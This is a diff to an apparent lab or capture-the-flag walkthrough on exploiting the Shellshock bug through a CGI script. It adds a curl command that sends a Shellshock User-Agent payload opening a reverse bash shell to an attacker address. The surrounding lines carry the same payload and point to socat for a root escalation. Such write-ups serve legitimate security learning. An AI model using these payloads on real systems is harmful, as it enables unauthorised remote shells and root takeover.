@@ -52,6 +52,12 @@ And in the ```User-Agent``` edit it to this:
 ```
 User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.0.40/1234 0>&1
 ```
+
+You can also do it using ```curl```
+```zsh
+curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.0.40/1234 0>&1' http://172.31.1.3/cgi-bin/test.cgi
+```
+
 And you will have a shell. Do a ```sudo -l ``` and you see that you can use socat with sudo without password and it will get executed with root privileges.Socat is a data transfer tool and similar to netcat
 
 Start a ```socat``` listener on a your attacker machine
